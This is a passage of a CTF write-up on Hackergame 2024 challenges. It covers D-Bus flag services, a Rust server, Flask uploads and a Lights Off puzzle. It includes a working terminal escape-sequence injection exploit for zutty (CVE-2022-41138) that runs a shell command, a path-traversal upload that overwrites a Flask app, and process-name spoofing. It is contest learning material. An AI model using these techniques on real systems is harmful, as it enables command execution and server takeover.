```

Nope, it needs a parameter. The C code wants `Please give me flag1`. I asked GPT how to pass parameters.

```bash
gdbus call --system \
           --dest cn.edu.ustc.lug.hack.FlagService \
           --object-path /cn/edu/ustc/lug/hack/FlagService \
           --method cn.edu.ustc.lug.hack.FlagService.GetFlag1 \
           "Please give me flag1"
```

- `flag{every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_??????????}`

### If I Could Be A File Descriptor

In `flagserver.c`, `GetFlag2` requires a file descriptor. How do you create one in bash? Ask GPT!

```bash
exec 3</path/to/file
```

Alright, let's do it:

```bash
touch /tmp/a
exec 3</tmp/a
gdbus call --system \
           --dest cn.edu.ustc.lug.hack.FlagService \
           --object-path /cn/edu/ustc/lug/hack/FlagService \
           --method cn.edu.ustc.lug.hack.FlagService.GetFlag2 \
           3

Error: GDBus.Error:org.gtk.GDBus.UnmappedGError.Quark._g_2dio_2derror_2dquark.Code3: Please don't give me a file on disk to trick me!
```

🌚 No disk files allowed? From [this article](https://yushuaige.github.io/2020/08/14/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/), I learned that not only files on disk have file descriptors -- stdin/out also do. So I asked GPT to write an anonymous pipe and create a FD.

```bash
{
  echo "Please give me flag2" | {
    gdbus call --system \
               --dest cn.edu.ustc.lug.hack.FlagService \
               --object-path /cn/edu/ustc/lug/hack/FlagService \
               --method cn.edu.ustc.lug.hack.FlagService.GetFlag2 \
               3
  } 3<&0
} 3<&1
```

- `flag{n5tw0rk_TrAnSpaR5Ncy_d0n0t_11k5_Fd_??????????}`

### Comm Say Maybe

First, try calling `GetFlag3` directly:

```bash
gdbus call --system \
           --dest cn.edu.ustc.lug.hack.FlagService \
           --object-path /cn/edu/ustc/lug/hack/FlagService \
           --method cn.edu.ustc.lug.hack.FlagService.GetFlag3
Error: GDBus.Error:org.gtk.GDBus.UnmappedGError.Quark._g_2dio_2derror_2dquark.Code3: You shall use getflag3 to call me!
```

So we need to call it with `getflag3`. In `flagserver.c`, it reads `/proc/<pid>/comm` to get the process name. If it's not `getflag3`, it returns an error.

My method was simple: recompile `getflag3` but add a line to print the flag.

```c
g_print("%s\n", flag);
```

Then I compiled it in Docker, base64-encoded it, and replaced the original `getflag3` with the base64 in a script.

```bash
#!/bin/bash

base64 -d <<< "<base64 data>" > /dev/shm/getflag3

chmod +x /dev/shm/getflag3
/dev/shm/getflag3
```

- `flag{prprprprprCTL_15your_FRiEND_??????????}`

## RISC-V: Die Hard

Couldn't do it, skipped.

See the [official writeup](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/RISC-V%EF%BC%9A%E8%99%8E%E8%83%86%E9%BE%99%E5%A8%81).

## Animation Sharing

This one cost me an all-nighter and a half 🫠.

### As long as the HTTP service doesn't stop, the response keeps extending

I thought about the first task for a long time because I started in the wrong direction (the second task). I was trying to make the program exit. During local debugging, the server often hung. It turns out the Rust server is single-threaded: if one request isn't finished, later requests are blocked.

So how do we keep the program running while making the checker think it has exited? Use [`daemon(3)`](https://man7.org/linux/man-pages/man3/daemon.3.html).

```rust
use nix::unistd::daemon;
use nix::unistd::sleep;

fn main() {
    let stream = std::net::TcpStream::connect("127.0.0.1:8000").unwrap();
    println!("done");
    daemon(false, false).unwrap();
    sleep(1000);
}
```

Here I used the [nix](https://crates.io/crates/nix) crate for syscalls.

- `flag{wa1t_no0O0oooO_mY_b1azIngfA5t_raust_f11r5erVer_??????????}`

### A terminal emulator of hope, connecting our bonds

This one drove me to despair. I read Rust `fileserver` code 800 times and found nowhere it could panic. (But others said you could cause a panic by passing `\x80` in the URL.)

The prompt said "a legacy terminal emulator compiled years ago," and the `Dockerfile` specifically installs `zutty` v0.12. So I guessed this emulator might be vulnerable.

Searching `zutty cve` leads to [CVE-2022-41138](https://nvd.nist.gov/vuln/detail/CVE-2022-41138) and a [POC](https://bugs.gentoo.org/868495).

Digging further, I learned what `DECRQSS` is, then found [this article](https://dgl.cx/2023/09/ansi-terminal-security#mintty-osc50). It basically threw the answer in my face.

I constructed a string that simulates pressing Ctrl-C in `zutty` and running `cat /flag2 > /flag3`.

```
printf "\e[0m\eP\$q\x3\e\\ \eP\$qm\rcat /flag2 > /flag3\r\e\\ \eP\$qm\e\\ "
```

I put this string in the URL and hoped to get the flag... right???

```rust
use std::{fs, io::Write, net::TcpStream, thread::sleep};

fn main() {
    let header = b"GET /";
    let res: [u8; 18] = [
        27, 91, 48, 109, 27, 80, 36, 113, 3, 27, 92, 32, 27, 80, 36, 113, 109, 13,
    ];
    let command = b"cat /flag2 > /flag3";
    let res2: &[u8; 12] = &[13, 27, 92, 32, 27, 80, 36, 113, 109, 27, 92, 32];
    let bytes = [header.as_ref(), &res, command, res2].concat();

    let mut stream = TcpStream::connect("127.0.0.1:8000").unwrap();
    stream.write_all(&bytes).unwrap();

    sleep(std::time::Duration::from_secs(1));

    let res = fs::read("/flag3").unwrap();
    let flag = String::from_utf8_lossy(&res);
    println!("{}", flag);
}
```

Running this locally in Docker, I got the flag. But in the contest environment, it failed:

```
called `Result::unwrap()` on an `Err` value: Os { code: 2, kind: NotFound, message: "No such file or directory" }
```

No idea why the Docker env differed from the contest env. But switching the path to `/tmp/flag3` worked. 🤦

So I could get two flags at once, though I already had the first one.

- `flag{xterm_&_DECRQSS_in_2008_0NcE_morE_??????????}`

## Online LESS File Viewer

Couldn't solve it. Read the solution -- felt unrelated to web, yet it was categorized as web.

See the [official writeup](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/LESS%20%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8%E5%9C%A8%E7%BA%BF%E7%89%88).

## Lights Off

GPT's shining moment. I calculated all night and still couldn't solve it, filling several pages of scratch. But after tweaking the GPT prompt, it solved it for me.

### Easy

Using GPT's code with a small modification gives the following program.

```python
def get_answer(lights_string):
    # Convert the lights array string back to numpy array
    lights_array = np.array(list(map(int, lights_string)), dtype=np.uint8).reshape(
        n, n, n
    )

    # Create the coefficient matrix for the linear system
    A = np.zeros((n**3, n**3), dtype=np.uint8)

    def index(x, y, z):
        return x * n * n + y * n + z

    for x in range(n):
        for y in range(n):
            for z in range(n):
                idx = index(x, y, z)
                A[idx, idx] = 1
                if x > 0:
                    A[idx, index(x - 1, y, z)] ^= 1
                if x < n - 1:
                    A[idx, index(x + 1, y, z)] ^= 1
                if y > 0:
                    A[idx, index(x, y - 1, z)] ^= 1
                if y < n - 1:
                    A[idx, index(x, y + 1, z)] ^= 1
                if z > 0:
                    A[idx, index(x, y, z - 1)] ^= 1
                if z < n - 1:
                    A[idx, index(x, y, z + 1)] ^= 1

    # Flatten the lights array to get the right-hand side of the equation
    b = lights_array.flatten()

    # Solve the linear system A * x = b in GF(2)
    # We will use Gaussian elimination in GF(2)
    A = A.astype(np.bool_)
    b = b.astype(np.bool_)

    # Gaussian elimination
    for i in range(n**3):
        if not A[i, i]:
            for j in range(i + 1, n**3):
                if A[j, i]:
                    A[[i, j]] = A[[j, i]]
                    b[[i, j]] = b[[j, i]]
                    break
        for j in range(i + 1, n**3):
            if A[j, i]:
                A[j] ^= A[i]
                b[j] ^= b[i]

    x = np.zeros(n**3, dtype=np.bool_)
    for i in range(n**3 - 1, -1, -1):
        if b[i]:
            x[i] = 1
            for j in range(i):
                if A[j, i]:
                    b[j] ^= 1

    # Convert the solution back to the required format
    switch_array = x.astype(np.uint8).reshape(n, n, n)
    answer = "".join(map(str, switch_array.flatten().tolist()))

    return answer

n = 3
print(get_answer("111001001111101000001101010"))
```

- `flag{bru7e_f0rce_1s_a1l_y0u_n3ed_??????????}`

### Medium

Same as above, just change `n` to 5.

- `flag{prun1ng_1s_u5eful_??????????}`

### Hard

Same as above, change `n` to 11.

- `flag{lin3ar_alg3bra_1s_p0werful_??????????}`

### Impossible

Couldn't solve it. With n = 149 the computer explodes.

See the [official writeup](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/%E5%85%B3%E7%81%AF).

## No Involution

A very easy challenge, but since it was placed so late, I thought it would be hard.

From the prompt, `--reload` hot reload is enabled, so we should find the Flask entry file. Based on the [docs](https://flask.palletsprojects.com/en/stable/quickstart/), we guessed it's `app.py`. Then we just needed a way to modify it.

We captured a request and uploaded any file. From the code, files are uploaded to `/tmp/uploads`, while the site code is in `/tmp/web`, so we renamed the file to `../web/app.py`. For content, we saved the original code and tweaked it.

```python
@app.route("/", methods=["GET"])
def index():
    return open("answers.json").read()
```

Reload the page and it's now the raw `answers.json`. Convert the answers and you get the flag.

```js
const answers = [
  // ...
]
answers.map((n) => String.fromCharCode(n + 65)).join('')
```

- `flag{uno!!!!_esrever_now_U_run_MY_??????????????}`

## Don't even get me started about me starting from scratch alone in another world...

The title is so long...

### "Fine, the title can be long but the flag must be short"

Dirty work, all GPT, no technical content...

### "Even if you turn everything I say into a problem, you still won't win my favor, hmph"

Kill me, I can't do it 😥

## Summary

This was my second official CTF. The contest started while I was traveling in Japan, and I spent a whole day just doing CTF (peak rank #4 🤣). After returning to China, I spent another day traveling home, with severe sleep deprivation. Three hours before the contest ended, I finally gave up and went to sleep. It was exhausting, but enjoyable. I solved everything I could, so no regrets. Due to space, I skipped many attempts and explorations. Looking forward to the next ~~grind~~ contest.

As a very amateur CTFer, this result is good enough for me. ~~Not bad for a script kiddie.~~

#### Some ramblings

Whether it's GeekGame or HackerGame, it feels unfriendly to ARM macOS. "Wide Characters That Aren't Really Wide" and "Animation Sharing" both took me forever to prepare the environment.

> [!TIP]
> Luckily, most challenges can run under an x86 environment simulated by OrbStack.
>
> ```bash
> docker build --platform linux/amd64 .
> ```

> [!TIP]
> To build x86 Linux Rust binaries on macOS, use [`cross`](https://github.com/cross-rs/cross).

P.S. If there's a CTF team, feel free to invite me. (If I'm free.)

## Copyright

Copyright (c) [Kevin Deng](https://github.com/sxzz). All rights reserved.

<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />The writeup and unmarked source code in this work are licensed under the <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>. Parts that are explicitly marked follow their indicated licenses.
